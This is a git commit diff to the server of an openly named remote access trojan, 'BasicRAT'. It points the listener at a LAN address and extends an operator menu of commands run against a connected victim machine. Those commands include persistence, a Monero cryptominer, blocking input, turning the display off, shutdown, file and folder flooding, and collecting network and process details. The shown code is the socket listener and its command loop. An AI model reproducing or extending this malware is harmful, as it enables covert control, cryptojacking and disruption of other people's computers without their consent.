a4f63a293900d598843de63124bd38aee39d5194
sir <94076644+sirmilann@users.noreply.github.com>
2023-02-02 16:35:29 +0100

    Add files via upload

--- BasicRAT/server.py
+++ BasicRAT/server.py
@@ -1,11 +1,10 @@
-# Server
 import socket,os
 from colorama import Fore
 
 os.system("cls")
 
 # Globals
-IP = "127.0.0.1"
+IP = "192.168.178.185"
 PORT = 8888
 DATA = 16384
 
@@ -25,23 +24,31 @@ servermain.listen(1)
 client, clientaddr = servermain.accept()
 print(f"[*] Got A Connection from {clientaddr}.")
 print("""
-* = Requires Admin
-• Volup. Turns The Clients Volume Up By 2 Percent
+* = Requires Admin.
+• Volup. Turns The Clients Volume Up By 2 Percent.
 • Voldown. Decreases The Clients Volume By 2 Percent.
 • Persist. Makes The Client File Persist On The System.
 • Mine. Starts A Powerfull XMR Miner On The Clients System.
 • Cd. Changes The CWD.
-• Dir. Shows All The Files In A Location
-• Shutdown. Shuts The Clients System Off
-• Blockinput. Blocks The Clients Input *
-• Unblockinput. Unblocks The Clients Input *
-• Displayoff. Turns The Client Display Off *
+• Dir. Shows All The Files In A Location.
+• Shutdown. Shuts The Clients System Off.
+• Blockinput. Blocks The Clients Input. *
+• Unblockinput. Unblocks The Clients Input. *
+• Displayoff. Turns The Client Display Off. *
+• Displayon. Turns The Client Display On. *
+• Getos. Gets Info About The PC.
+• Folderflood. Makes 1 To 100 New Folders In The CWD.
+• Fileflood. Makes 1 To 100 New Files In The CWD.
+• Restart. Restarts The Clients System
+• Netinfo. Shows The Clients [IP Address, MAC Address, Netmask].
+• Logoff. Logs The Client Out Of The PC.
+• Getproc. Gets All The Running Processes.
 """)
 
 while True:
     try:
         cmd = input("$")
-        if cmd[0:2] == "cd":
+        if cmd[:2] == "cd":
             os.chdir(cmd[3:])
         if cmd == "exit":
             client.close()
